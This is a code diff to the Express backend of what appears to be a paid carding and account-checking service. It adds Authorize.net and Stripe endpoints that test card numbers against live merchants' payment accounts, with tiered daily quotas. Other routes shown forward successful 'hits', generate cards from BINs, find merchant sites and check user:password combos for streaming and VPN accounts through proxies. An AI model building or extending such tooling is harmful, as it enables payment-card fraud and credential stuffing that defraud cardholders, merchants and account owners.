@@ -1,11 +1,30 @@
 import type { Express, Request, Response, NextFunction } from "express";
 import { createServer, type Server } from "http";
-import { spawn, execFile } from "child_process";
+import { spawn, execFile, execFileSync } from "child_process";
 import * as path from "path";
 import * as fs from "fs";
 import * as crypto from "crypto";
 import { botManager } from "./botManager";
 import { saveAllJsonFiles, saveJsonFile } from "./json-persistence";
+import {
+  API_ENDPOINTS,
+  API_FLOW,
+  API_LIMITS,
+  API_META,
+  API_NOTE,
+  REASON_CODES,
+  STRIPE_FLOW,
+  STRIPE_LIMITS,
+  STRIPE_REASON_CODES,
+} from "@shared/api-registry";
+import {
+  ACCOUNT_CHECKER_IDS,
+  ACCOUNT_CHECKERS,
+  ACCOUNT_HIT_STATUSES,
+  isAccountError,
+  isAccountVerdict,
+  normalizeAccountStatus,
+} from "@shared/account-checkers";
 
 // ── Cloudflare helpers ────────────────────────────────────────────────────
 // Source: https://www.cloudflare.com/ips/
@@ -178,6 +197,30 @@ interface ActivityEvent {
 const activityLog: ActivityEvent[] = [];
 const MAX_ACTIVITY_LOG = 100;
 
+/**
+ * Resolve the Python interpreter to spawn.
+ *
+ * The VPS is Linux and has "python3".  Windows only has "python", and
+ * "python3" there is usually a Microsoft Store stub that exits with an
+ * error.  Resolve once at startup and reuse the result.
+ */
+function resolvePythonBin(): string {
+  if (process.env.PYTHON_BIN) return process.env.PYTHON_BIN;
+  if (process.platform === "win32") {
+    const candidates = ["python", "py", "python3"];
+    for (const c of candidates) {
+      try {
+        execFileSync(c, ["--version"], { stdio: "ignore", timeout: 5000 });
+        return c;
+      } catch {}
+    }
+    return "python";
+  }
+  return "python3";
+}
+
+const PYTHON_BIN = resolvePythonBin();
+
 function addActivity(event: Omit<ActivityEvent, "id" | "timestamp">) {
   activityLog.unshift({
     ...event,
@@ -193,7 +236,7 @@ function sendGroupLog(userName: string, userId: string, card: string, gateway: s
   const botDir = path.resolve(process.cwd(), "bot");
   const groupLogScript = path.join(botDir, "web_group_log.py");
   try {
-    const proc = spawn("python3", ["-u", groupLogScript, userName, userId, card, gateway, response, logType, site, amount, realSite || site], {
+    const proc = spawn(PYTHON_BIN, ["-u", groupLogScript, userName, userId, card, gateway, response, logType, site, amount, realSite || site], {
       cwd: botDir,
       env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
       timeout: 15000,
@@ -263,6 +306,7 @@ interface TierLimits {
   dailyChecks: number;
   maxBatchCards: number;
   dailyShopifyChecks: number;
+  dailyStripeChecks: number;
   massAccountMax: number;
   dailyFindsiteSearches: number;
   parallelWorkers: number;
@@ -274,6 +318,7 @@ const TIER_LIMITS: Record<UserTier, TierLimits> = {
     dailyChecks: 500,
     maxBatchCards: 50,
     dailyShopifyChecks: 1000,
+    dailyStripeChecks: 1000,
     massAccountMax: 1,
     dailyFindsiteSearches: 0,
     parallelWorkers: 1,
@@ -283,6 +328,7 @@ const TIER_LIMITS: Record<UserTier, TierLimits> = {
     dailyChecks: 5000,
     maxBatchCards: 1000,
     dailyShopifyChecks: 10000,
+    dailyStripeChecks: 10000,
     massAccountMax: 500,
     dailyFindsiteSearches: 3,
     parallelWorkers: 3,
@@ -292,6 +338,7 @@ const TIER_LIMITS: Record<UserTier, TierLimits> = {
     dailyChecks: -1,
     maxBatchCards: 5000,
     dailyShopifyChecks: -1,
+    dailyStripeChecks: -1,
     massAccountMax: 1000,
     dailyFindsiteSearches: 10,
     parallelWorkers: 5,
@@ -361,6 +408,7 @@ function getTierLimits(tier: UserTier): TierLimits {
 interface DailyUsageEntry {
   checks: number;
   shopifyChecks: number;
+  stripeChecks: number;
   findsiteSearches: number;
   accountMassChecks: number;
   hitterHits: number;
@@ -404,7 +452,7 @@ function getUserDailyUsage(userId: string): DailyUsageEntry {
   const today = getTodayStr();
   let usage = dailyUsage.get(userId);
   if (!usage || usage.date !== today) {
-    usage = { checks: 0, shopifyChecks: 0, findsiteSearches: 0, accountMassChecks: 0, hitterHits: 0, date: today };
+    usage = { checks: 0, shopifyChecks: 0, stripeChecks: 0, findsiteSearches: 0, accountMassChecks: 0, hitterHits: 0, date: today };
     dailyUsage.set(userId, usage);
   }
   return usage;
@@ -420,6 +468,7 @@ function checkDailyLimit(userId: string, type: keyof Omit<DailyUsageEntry, "date
   switch (type) {
     case "checks": limit = limits.dailyChecks; used = usage.checks; break;
     case "shopifyChecks": limit = limits.dailyShopifyChecks; used = usage.shopifyChecks; break;
+    case "stripeChecks": limit = limits.dailyStripeChecks; used = usage.stripeChecks; break;
     case "findsiteSearches": limit = limits.dailyFindsiteSearches; used = usage.findsiteSearches; break;
     case "accountMassChecks": limit = limits.massAccountMax; used = usage.accountMassChecks; break;
     case "hitterHits": limit = limits.dailyHitterHits; used = usage.hitterHits; break;
@@ -461,6 +510,43 @@ export async function registerRoutes(
 ): Promise<Server> {
   app.get("/api/healthz", (_req, res) => {
     res.status(200).json({ status: "ok" });
+  });
+
+  // ── Authorize.net API index ──────────────────────────────────────────────
+  // Machine-readable reference for the /an gateway.  The data comes from
+  // @shared/api-registry, which the /docs page renders too, so the two
+  // never drift apart.
+  app.get("/api/docs", (_req, res) => {
+    const mapEndpoint = (e: any) => ({
+      method: e.method,
+      path: e.path,
+      auth: e.auth,
+      summary: e.summary,
+      description: e.description,
+      body: e.body,
+      responseExample: e.responseExampleJson ?? e.responseExample,
+      errors: e.errors,
+      notes: e.notes,
+    });
+    res.status(200).json({
+      ...API_META,
+      limits: API_LIMITS,
+      flow: API_FLOW,
+      note: API_NOTE,
+      endpoints: API_ENDPOINTS.map(mapEndpoint),
+      reasonCodes: REASON_CODES,
+      // the Stripe $0 check (/st) has its own endpoint, flow and codes
+      stripe: {
+        name: "Stripe $0 API",
+        version: "1.0",
+        gateway: "st",
+        flow: STRIPE_FLOW,
+        limits: STRIPE_LIMITS,
+        note: "No money moves and the card is never charged. The card is sent to the issuing bank for a $0 verification, so a Luhn-valid card can still come back declined.",
+        endpoints: API_ENDPOINTS.filter((e) => e.path.startsWith("/api/stripe/")).map(mapEndpoint),
+        reasonCodes: STRIPE_REASON_CODES,
+      },
+    });
   });
 
   const otpRateLimit = new Map<string, number>();
@@ -704,7 +790,7 @@ export async function registerRoutes(
       const infoScript = path.join(botDir, "get_user_info.py");
       const infoResult = await new Promise<string>((resolve) => {
         let output = "";
-        const proc = spawn("python3", ["-u", infoScript, uid], {
+        const proc = spawn(PYTHON_BIN, ["-u", infoScript, uid], {
           cwd: botDir,
           env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
           timeout: 10000,
@@ -990,7 +1076,7 @@ export async function registerRoutes(
 
       const botDir = path.resolve(process.cwd(), "bot");
       const checkScript = path.join(botDir, "check_member.py");
-      const pythonPath = process.env.PYTHON_PATH || "python3";
+      const pythonPath = process.env.PYTHON_PATH || PYTHON_BIN;
 
       const result = await new Promise<string>((resolve, reject) => {
         execFile(pythonPath, [checkScript, userId], { timeout: 15000, cwd: botDir }, (err: any, stdout: string) => {
@@ -1635,11 +1721,14 @@ export async function registerRoutes(
       const userId = req.session?.userId || "";
       const { gateway: reqGateway } = req.body;
       const isShopifySingle = typeof reqGateway === "string" && reqGateway.toLowerCase().startsWith("shp");
-      const usageTypeSingle = isShopifySingle ? "shopifyChecks" as const : "checks" as const;
+      const isStripeSingle = typeof reqGateway === "string" && reqGateway.toLowerCase().startsWith("st");
+      const usageTypeSingle = isShopifySingle ? "shopifyChecks" as const
+        : isStripeSingle ? "stripeChecks" as const : "checks" as const;
       const dailyCheck = checkDailyLimit(userId, usageTypeSingle);
       if (!dailyCheck.allowed) {
         const tier = getUserTier(userId);
-        return res.status(403).json({ status: "error", response: `Daily ${isShopifySingle ? "Shopify " : ""}check limit reached (${dailyCheck.limit}). Upgrade your plan for more.`, tierLimit: true, tier, used: dailyCheck.used, limit: dailyCheck.limit });
+        const label = isShopifySingle ? "Shopify " : isStripeSingle ? "Stripe " : "";
+        return res.status(403).json({ status: "error", response: `Daily ${label}check limit reached (${dailyCheck.limit}). Upgrade your plan for more.`, tierLimit: true, tier, used: dailyCheck.used, limit: dailyCheck.limit });
       }
 
       const clientIp = getClientIp(req);
@@ -1680,7 +1769,7 @@ export async function registerRoutes(
           let settled = false;
           const userId = req.session?.userId || "";
           const userIsAdmin = req.session?.isAdmin ? "true" : "false";
-          const proc = spawn("python3", ["-u", checkerScript, gateway, cardClean, userId, userIsAdmin], {
+          const proc = spawn(PYTHON_BIN, ["-u", checkerScript, gateway, cardClean, userId, userIsAdmin], {
             cwd: botDir,
             env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
             timeout: spawnTimeout,
@@ -1736,7 +1825,7 @@ export async function registerRoutes(
 
           if (parsed.status === "charged") {
             const forwardScript = path.join(botDir, "web_forward_hit.py");
-            const fwProc = spawn("python3", ["-u", forwardScript, req.session.userId, cardClean, gateway, parsed.response || "Charged", userName], {
+            const fwProc = spawn(PYTHON_BIN, ["-u", forwardScript, req.session.userId, cardClean, gateway, parsed.response || "Charged", userName], {
               cwd: botDir,
               env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
               timeout: 15000,
@@ -1756,6 +1845,241 @@ export async function registerRoutes(
             });
           }
         }
+      } finally {
+        releaseCheckSlot();
+      }
+    } catch (err: any) {
+      res.status(500).json({ status: "error", response: err.message?.slice(0, 200) || "Check failed" });
+    }
+  });
+
+  // ── Authorize.net gateway (single check) ─────────────────────────────────
+  // Dedicated endpoint for the "an" gate.  Kept separate from /api/check
+  // because it runs a real $0.01 transaction against a live merchant and
+  // needs a longer timeout than the standard 70s.
+  app.post("/api/authnet/check", requireAuth, async (req, res) => {
+    try {
+      const userId = req.session?.userId || "";
+      const { card } = req.body;
+
+      if (!card || typeof card !== "string") {
+        return res.status(400).json({ status: "error", response: "Missing card" });
+      }
+      if (card.length > 40) {
+        return res.status(400).json({ status: "error", response: "Invalid input" });
+      }
+
+      const cardClean = card.trim();
+      if (!/^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$/.test(cardClean)) {
+        return res.status(400).json({ status: "error", response: "Invalid card format. Use: CC|MM|YY|CVV" });
+      }
+
+      const dailyCheck = checkDailyLimit(userId, "checks");
+      if (!dailyCheck.allowed) {
+        const tier = getUserTier(userId);
+        return res.status(403).json({
+          status: "error",
+          response: `Daily check limit reached (${dailyCheck.limit}). Upgrade your plan for more.`,
+          tierLimit: true,
+          tier,
+          used: dailyCheck.used,
+          limit: dailyCheck.limit,
+        });
+      }
+
+      const clientIp = getClientIp(req);
+      const now = Date.now();
+      const timestamps = (checkRateLimit.get(clientIp) || []).filter(t => now - t < 60000);
+      if (timestamps.length >= MAX_CHECKS_PER_MINUTE) {
+        return res.status(429).json({ status: "error", response: "Rate limit exceeded. Max 10 checks per minute." });
+      }
+      timestamps.push(now);
+      checkRateLimit.set(clientIp, timestamps);
+
+      if (!acquireCheckSlot()) {
+        return res.status(503).json({ status: "error", response: "Server busy. Try again shortly." });
+      }
+
+      const botDir = path.resolve(process.cwd(), "bot");
+      const checkerScript = path.join(botDir, "web_authnet_check.py");
+      const parts = cardClean.split("|");
+      const userIsAdmin = req.session?.isAdmin ? "true" : "false";
+
+      try {
+        const result = await new Promise<string>((resolve, reject) => {
+          let output = "";
+          let errOutput = "";
+          let settled = false;
+
+          const cleanup = () => {
+            if (!settled && !res.writableEnded) {
+              settled = true;
+              try { proc.kill("SIGTERM"); } catch {}
+              setTimeout(() => { try { proc.kill("SIGKILL"); } catch {} }, 2000);
+              reject(new Error("Client disconnected"));
+            }
+          };
+
+          const proc = spawn(
+            PYTHON_BIN,
+            ["-u", checkerScript, parts[0], parts[1], parts[2], parts[3], userId, userIsAdmin],
+            {
+              cwd: botDir,
+              env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
+              timeout: 120000,
+            }
+          );
+
+          req.socket?.on("close", cleanup);
+
+          proc.stdout?.on("data", (data: Buffer) => { output += data.toString(); });
+          proc.stderr?.on("data", (data: Buffer) => { errOutput += data.toString(); });
+
+          proc.on("close", (code) => {
+            if (settled) return;
+            settled = true;
+            req.socket?.removeListener("close", cleanup);
+            if (code === 0 && output.trim()) {
+              resolve(output.trim());
+            } else {
+              reject(new Error(errOutput.slice(0, 300) || `Process exited with code ${code}`));
+            }
+          });
+
+          proc.on("error", (err) => {
+            if (settled) return;
+            settled = true;
+            req.socket?.removeListener("close", cleanup);
+            reject(err);
+          });
+        });
+
+        const lines = result.split("\n");
+        const jsonLine = lines.reverse().find(l => l.trim().startsWith("{"));
+        if (!jsonLine) {
+          return res.status(500).json({ status: "error", response: "Invalid checker response" });
+        }
+        const parsed = JSON.parse(jsonLine);
+        incrementUsage(userId, "checks");
+        res.json(parsed);
+      } catch (err: any) {
+        res.status(500).json({ status: "error", response: err.message?.slice(0, 200) || "Check failed" });
+      } finally {
+        releaseCheckSlot();
+      }
+    } catch (err: any) {
+      res.status(500).json({ status: "error", response: err.message?.slice(0, 200) || "Check failed" });
+    }
+  });
+
+  // ── Stripe $0 auth gateway (single check) ────────────────────────────────
+  // Dedicated endpoint for the "st" gate.  It runs a $0 card verification
+  // against a live merchant's Stripe account: the store confirms a setup
+  // intent with its own secret key, so the issuing bank answers without
+  // any money moving.  Kept separate from /api/check so it can be
+  // documented on its own and given its own quota.
+  app.post("/api/stripe/check", requireAuth, async (req, res) => {
+    try {
+      const userId = req.session?.userId || "";
+      const { card } = req.body;
+
+      if (!card || typeof card !== "string") {
+        return res.status(400).json({ status: "error", response: "Missing card" });
+      }
+      if (card.length > 40) {
+        return res.status(400).json({ status: "error", response: "Invalid input" });
+      }
+
+      const cardClean = card.trim();
+      if (!/^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$/.test(cardClean)) {
+        return res.status(400).json({ status: "error", response: "Invalid card format. Use: CC|MM|YY|CVV" });
+      }
+
+      const dailyCheck = checkDailyLimit(userId, "stripeChecks");
+      if (!dailyCheck.allowed) {
+        const tier = getUserTier(userId);
+        return res.status(403).json({
+          status: "error",
+          response: `Daily Stripe check limit reached (${dailyCheck.limit}). Upgrade your plan for more.`,
+          tierLimit: true,
+          tier,
+          used: dailyCheck.used,
+          limit: dailyCheck.limit,
+        });
+      }
+
+      const clientIp = getClientIp(req);
+      const now = Date.now();
+      const timestamps = (checkRateLimit.get(clientIp) || []).filter(t => now - t < 60000);
+      if (timestamps.length >= MAX_CHECKS_PER_MINUTE) {
+        return res.status(429).json({ status: "error", response: "Rate limit exceeded. Max 10 checks per minute." });
+      }
+      timestamps.push(now);
+      checkRateLimit.set(clientIp, timestamps);
+
+      if (!acquireCheckSlot()) {
+        return res.status(503).json({ status: "error", response: "Server busy. Try again shortly." });
+      }
+
+      const botDir = path.resolve(process.cwd(), "bot");
+      const checkerScript = path.join(botDir, "web_checker.py");
+      const userIsAdmin = req.session?.isAdmin ? "true" : "false";
+
+      try {
+        const result = await new Promise<string>((resolve, reject) => {
+          let output = "";
+          let errOutput = "";
+          let settled = false;
+
+          const cleanup = () => {
+            if (!settled && !res.writableEnded) {
+              settled = true;
+              try { proc.kill("SIGTERM"); } catch {}
+              setTimeout(() => { try { proc.kill("SIGKILL"); } catch {} }, 2000);
+              reject(new Error("Client disconnected"));
+            }
+          };
+
+          const proc = spawn(PYTHON_BIN, ["-u", checkerScript, "st", cardClean, userId, userIsAdmin], {
+            cwd: botDir,
+            env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
+            timeout: 90000,
+          });
+
+          req.socket?.on("close", cleanup);
+
+          proc.stdout?.on("data", (data: Buffer) => { output += data.toString(); });
+          proc.stderr?.on("data", (data: Buffer) => { errOutput += data.toString(); });
+
+          proc.on("close", (code) => {
+            if (settled) return;
+            settled = true;
+            req.socket?.removeListener("close", cleanup);
+            if (code === 0 && output.trim()) {
+              resolve(output.trim());
+            } else {
+              reject(new Error(errOutput.slice(0, 300) || `Process exited with code ${code}`));
+            }
+          });
+
+          proc.on("error", (err) => {
+            if (settled) return;
+            settled = true;
+            req.socket?.removeListener("close", cleanup);
+            reject(err);
+          });
+        });
+
+        const lines = result.split("\n");
+        const jsonLine = lines.reverse().find(l => l.trim().startsWith("{"));
+        if (!jsonLine) {
+          return res.status(500).json({ status: "error", response: "Invalid checker response" });
+        }
+        const parsed = JSON.parse(jsonLine);
+        incrementUsage(userId, "stripeChecks");
+        res.json(parsed);
+      } catch (err: any) {
+        res.status(500).json({ status: "error", response: err.message?.slice(0, 200) || "Check failed" });
       } finally {
         releaseCheckSlot();
       }
@@ -1821,7 +2145,7 @@ export async function registerRoutes(
       let errOutput = "";
       let settled = false;
 
-      const proc = spawn("python3", ["-u", checkerScript, gateway, card, userId, isAdmin ? "true" : "false"], {
+      const proc = spawn(PYTHON_BIN, ["-u", checkerScript, gateway, card, userId, isAdmin ? "true" : "false"], {
         cwd: botDir,
         env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
         timeout: spawnTimeout,
@@ -1914,7 +2238,7 @@ export async function registerRoutes(
           if (result.status === "charged") {
             const botDir = path.resolve(process.cwd(), "bot");
             const forwardScript = path.join(botDir, "web_forward_hit.py");
-            const fwProc = spawn("python3", ["-u", forwardScript, job.userId, card, job.gateway, result.response || "Charged", job.userName || job.userId], {
+            const fwProc = spawn(PYTHON_BIN, ["-u", forwardScript, job.userId, card, job.gateway, result.response || "Charged", job.userName || job.userId], {
               cwd: botDir,
               env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
               timeout: 15000,
@@ -1978,7 +2302,10 @@ export async function registerRoutes(
       const tier = getUserTier(userId);
       const limits = getTierLimits(tier);
       const isShopify = typeof gateway === "string" && gateway.toLowerCase().startsWith("shp");
-      const usageType = isShopify ? "shopifyChecks" as const : "checks" as const;
+      const isStripe = typeof gateway === "string" && gateway.toLowerCase().startsWith("st");
+      const usageType = isShopify ? "shopifyChecks" as const
+        : isStripe ? "stripeChecks" as const : "checks" as const;
+      const usageLabel = isShopify ? "Shopify " : isStripe ? "Stripe " : "";
 
       if (validCards.length > limits.maxBatchCards) {
         return res.status(400).json({ error: `Your ${tier} plan allows max ${limits.maxBatchCards} cards per batch. Upgrade for more.`, tierLimit: true, tier, limit: limits.maxBatchCards });
@@ -1986,7 +2313,7 @@ export async function registerRoutes(
 
       const dailyCheck = checkDailyLimit(userId, usageType);
       if (!dailyCheck.allowed) {
-        return res.status(403).json({ error: `Daily ${isShopify ? "Shopify " : ""}check limit reached (${dailyCheck.limit}). Upgrade your plan.`, tierLimit: true, tier, used: dailyCheck.used, limit: dailyCheck.limit });
+        return res.status(403).json({ error: `Daily ${usageLabel}check limit reached (${dailyCheck.limit}). Upgrade your plan.`, tierLimit: true, tier, used: dailyCheck.used, limit: dailyCheck.limit });
       }
       if (dailyCheck.limit !== -1 && validCards.length > dailyCheck.remaining) {
         return res.status(400).json({ error: `Only ${dailyCheck.remaining} checks remaining today. Reduce batch size or upgrade.`, tierLimit: true, tier, remaining: dailyCheck.remaining, limit: dailyCheck.limit });
@@ -2109,7 +2436,7 @@ export async function registerRoutes(
       const result = await new Promise<string>((resolve, reject) => {
         let output = "";
         let errOutput = "";
-        const proc = spawn("python3", ["-u", toolScript, "gen", bin, String(qty), month || "xx", year || "xx", cvv || "xxx"], {
+        const proc = spawn(PYTHON_BIN, ["-u", toolScript, "gen", bin, String(qty), month || "xx", year || "xx", cvv || "xxx"], {
           cwd: botDir,
           env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
           timeout: 15000,
@@ -2144,7 +2471,7 @@ export async function registerRoutes(
 
       const result = await new Promise<string>((resolve, reject) => {
         let output = "";
-        const proc = spawn("python3", ["-u", toolScript, "filter"], {
+        const proc = spawn(PYTHON_BIN, ["-u", toolScript, "filter"], {
           cwd: botDir,
           env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
           timeout: 120000,
@@ -2173,7 +2500,7 @@ export async function registerRoutes(
     const botDir = path.resolve(process.cwd(), "bot");
     const script = path.join(botDir, "web_findsite.py");
     let output = "";
-    const proc = spawn("python3", ["-u", "-c",
+    const proc = spawn(PYTHON_BIN, ["-u", "-c",
       "import sys; sys.path.insert(0, '.'); from gates.site_finder import SUPPORTED_GATEWAYS; import json; print(json.dumps(SUPPORTED_GATEWAYS))"],
       { cwd: botDir, timeout: 10000 }
     );
@@ -2219,7 +2546,7 @@ export async function registerRoutes(
 
       const result = await new Promise<string>((resolve, reject) => {
         let output = "";
-        const proc = spawn("python3", ["-u", script, gateway, String(maxResults)], {
+        const proc = spawn(PYTHON_BIN, ["-u", script, gateway, String(maxResults)], {
           cwd: botDir,
           env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
           timeout: 120000,
@@ -2259,7 +2586,7 @@ export async function registerRoutes(
 
       const result = await new Promise<string>((resolve, reject) => {
         let output = "";
-        const proc = spawn("python3", ["-u", script, url.trim()], {
+        const proc = spawn(PYTHON_BIN, ["-u", script, url.trim()], {
           cwd: botDir,
           env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
           timeout: 40000,
@@ -2293,11 +2620,10 @@ export async function registerRoutes(
   app.get("/api/account-checkers/status", requireAuth, (_req, res) => {
     try {
       const settings = botManager.getBotSettings();
-      const checkerIds = ["crunchyroll", "xbox", "cyberghost", "duolingo", "hoichoi"];
       const statuses: Record<string, boolean> = {};
-      for (const id of checkerIds) {
-        const ts = settings.tool_settings?.[`acc_${id}`];
-        statuses[id] = ts?.enabled !== undefined ? ts.enabled : true;
+      for (const checker of ACCOUNT_CHECKERS) {
+        const ts = settings.tool_settings?.[checker.toolKey];
+        statuses[checker.id] = ts?.enabled !== undefined ? ts.enabled : true;
       }
       res.json(statuses);
     } catch (err: any) {
@@ -2377,17 +2703,16 @@ export async function registerRoutes(
         return res.status(400).json({ status: "error", message: "Missing checker or combo" });
       }
 
-      const validCheckers = ["crunchyroll", "xbox", "cyberghost", "duolingo", "hoichoi"];
-      if (!validCheckers.includes(checker)) {
+      if (!ACCOUNT_CHECKER_IDS.includes(checker)) {
         return res.status(400).json({ status: "error", message: "Invalid checker type" });
       }
 
+      const checkerInfo = ACCOUNT_CHECKERS.find((c) => c.id === checker)!;
       const settings = botManager.getBotSettings();
-      const toolKey = `acc_${checker}`;
-      const ts = settings.tool_settings?.[toolKey];
+      const ts = settings.tool_settings?.[checkerInfo.toolKey];
       const isEnabled = ts?.enabled !== undefined ? ts.enabled : true;
       if (!isEnabled) {
-        return res.status(403).json({ status: "error", message: `${checker} checker is currently disabled.` });
+        return res.status(403).json({ status: "error", message: `${checkerInfo.label} checker is currently disabled.` });
       }
 
       const comboClean = combo.trim();
@@ -2419,21 +2744,33 @@ export async function registerRoutes(
         const args = ["-u", checkerScript, checker, user, password];
         if (proxy) args.push(proxy);
 
+        // The checker's worst case is its own request timeouts times two
+        // (the python layer retries once on a network error).  A 30s kill
+        // was SIGTERMing crunchyroll and xbox mid-flight and returning a
+        // 500 that looked like a server crash.
+        const spawnTimeout = checkerInfo.timeoutSec * 1000;
+        // Leave headroom so the checker returns a result before the kill.
+        const budget = Math.max(5, checkerInfo.timeoutSec - 5);
+        args.push(String(budget));
+
         const result = await new Promise<string>((resolve, reject) => {
           let output = "";
           let errOutput = "";
-          const proc = spawn("python3", args, {
+          let timedOut = false;
+          const proc = spawn(PYTHON_BIN, args, {
             cwd: botDir,
             env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
-            timeout: 30000,
+            timeout: spawnTimeout,
           });
 
           proc.stdout?.on("data", (data: Buffer) => { output += data.toString(); });
           proc.stderr?.on("data", (data: Buffer) => { errOutput += data.toString(); });
 
-          proc.on("close", (code) => {
+          proc.on("close", (code, signal) => {
             if (code === 0 && output.trim()) {
               resolve(output.trim());
+            } else if (timedOut || signal === "SIGTERM") {
+              reject(new Error(`Checker timed out after ${checkerInfo.timeoutSec}s`));
             } else {
               reject(new Error(errOutput.slice(0, 300) || `Process exited with code ${code}`));
             }
@@ -2448,23 +2785,46 @@ export async function registerRoutes(
           return res.status(500).json({ status: "error", message: "Invalid checker response" });
         }
         const accResult = JSON.parse(jsonLine);
-        res.json(accResult);
 
-        if (accResult.status === "hit" || accResult.status === "premium" || accResult.status === "valid") {
+        // The python layer returns UPPERCASE statuses.  Normalize so a
+        // checker that invents a new value can never be read as a pass.
+        const status = normalizeAccountStatus(accResult.status);
+        const payload = {
+          ...accResult,
+          status,
+          capture: accResult.capture && typeof accResult.capture === "object" ? accResult.capture : {},
+        };
+
+        // A gateway failure is not a verdict -- do not charge the user's
+        // daily quota for it, and do not log it as a result.  ERROR means
+        // the checker itself is broken (endpoint moved, API revoked).
+        if (isAccountError(status)) {
+          return res.status(200).json(payload);
+        }
+
+        incrementUsage(userId, "accountMassChecks");
+
+        res.json(payload);
+
+        if (ACCOUNT_HIT_STATUSES.includes(status)) {
           const accUserName = [req.session?.firstName, req.session?.lastName].filter(Boolean).join(" ") || req.session?.username || req.session?.userId || "";
           addActivity({
             type: "account_hit",
             userName: accUserName,
             userId: req.session?.userId || "",
             message: `${accUserName} Got Account Hit ⚡`,
-            detail: `${checker} — ${accResult.message || accResult.status}`,
+            detail: `${checkerInfo.label} — ${accResult.message || status}`,
           });
         }
       } finally {
         activeAccountChecks--;
       }
     } catch (err: any) {
-      res.status(500).json({ status: "error", message: err.message?.slice(0, 200) || "Check failed" });
+      // A checker that times out or dies is a gateway failure, not a card
+      // verdict and not a server crash.  Return it as a normal error row so
+      // the client shows the reason instead of a bare 500.
+      const msg = err.message?.slice(0, 200) || "Check failed";
+      res.status(200).json({ status: "error", message: msg, capture: {} });
     }
   });
 
@@ -2612,7 +2972,7 @@ export async function registerRoutes(
       const result = await new Promise<string>((resolve, reject) => {
         let output = "";
         let settled = false;
-        const proc = spawn("python3", args, {
+        const proc = spawn(PYTHON_BIN, args, {
           cwd: botDir,
           env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
           timeout: 90000,
@@ -2671,7 +3031,7 @@ export async function registerRoutes(
         const successUrl = freshCache.success_url || (sessionCache as any)?.success_url || "";
         const adminSite = (() => { try { return successUrl ? new URL(successUrl.replace(/\{[^}]+\}/g, "x")).hostname.replace(/^www\./, "") : ""; } catch { return ""; } })();
 
-        spawn("python3", ["-u", forwardScript, req.session.userId, cardClean, "Stripe CO", data.message || "Charged", userName, merchantName, amount, checkoutUrl, adminSite], {
+        spawn(PYTHON_BIN, ["-u", forwardScript, req.session.userId, cardClean, "Stripe CO", data.message || "Charged", userName, merchantName, amount, checkoutUrl, adminSite], {
           cwd: botDir2,
           env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
           timeout: 15000,
@@ -2758,7 +3118,7 @@ export async function registerRoutes(
       const result = await new Promise<string>((resolve, reject) => {
         let output = "";
         let settled = false;
-        const proc = spawn("python3", args, {
+        const proc = spawn(PYTHON_BIN, args, {
           cwd: botDir,
           env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
           timeout: 90000,
@@ -2815,7 +3175,7 @@ export async function registerRoutes(
         const zeroDecimalCurrencies = ["BIF","CLP","DJF","GNF","JPY","KMF","KRW","MGA","PYG","RWF","UGX","VND","VUV","XAF","XOF","XPF"];
         const amount = (rawAmount != null && rawAmount !== "") ? `${zeroDecimalCurrencies.includes(rawCurrency) ? rawAmount : (Number(rawAmount) / 100).toFixed(2)} ${rawCurrency}` : "";
 
-        spawn("python3", ["-u", forwardScript, req.session.userId, cardClean, "Stripe Invoice", data.message || "Charged", userName, merchantName, amount, invoiceUrl, ""], {
+        spawn(PYTHON_BIN, ["-u", forwardScript, req.session.userId, cardClean, "Stripe Invoice", data.message || "Charged", userName, merchantName, amount, invoiceUrl, ""], {
           cwd: botDir2,
           env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
           timeout: 15000,
@@ -2901,7 +3261,7 @@ export async function registerRoutes(
       const result = await new Promise<string>((resolve, reject) => {
         let output = "";
         let settled = false;
-        const proc = spawn("python3", args, {
+        const proc = spawn(PYTHON_BIN, args, {
           cwd: botDir,
           env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
           timeout: 90000,
@@ -2955,7 +3315,7 @@ export async function registerRoutes(
         const site = freshCache.merchant || sessionCache?.merchant || "";
         const billingResponse = data.message || (data.status === "charged" ? "Charged" : "Approved");
 
-        spawn("python3", ["-u", forwardScript, req.session.userId, cardClean, "Stripe Billing", billingResponse, userName, site, "", billingUrl.slice(0, 120)], {
+        spawn(PYTHON_BIN, ["-u", forwardScript, req.session.userId, cardClean, "Stripe Billing", billingResponse, userName, site, "", billingUrl.slice(0, 120)], {
           cwd: botDir2,
           env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
           timeout: 15000,
@@ -2995,7 +3355,7 @@ export async function registerRoutes(
 
       const result = await new Promise<string>((resolve, reject) => {
         let output = "";
-        const proc = spawn("python3", ["-u", script, "fetch", checkoutUrl], {
+        const proc = spawn(PYTHON_BIN, ["-u", script, "fetch", checkoutUrl], {
           cwd: botDir,
           env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
           timeout: 30000,
@@ -3034,7 +3394,7 @@ export async function registerRoutes(
 
       const sendResult = await new Promise<string>((resolve, reject) => {
         let output = "";
-        const proc = spawn("python3", ["-u", script, "send", userName, userId, card, site || "", amount || ""], {
+        const proc = spawn(PYTHON_BIN, ["-u", script, "send", userName, userId, card, site || "", amount || ""], {
           cwd: botDir,
           env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
           timeout: 15000,
@@ -3072,7 +3432,7 @@ export async function registerRoutes(
       const result = await new Promise<string>((resolve, reject) => {
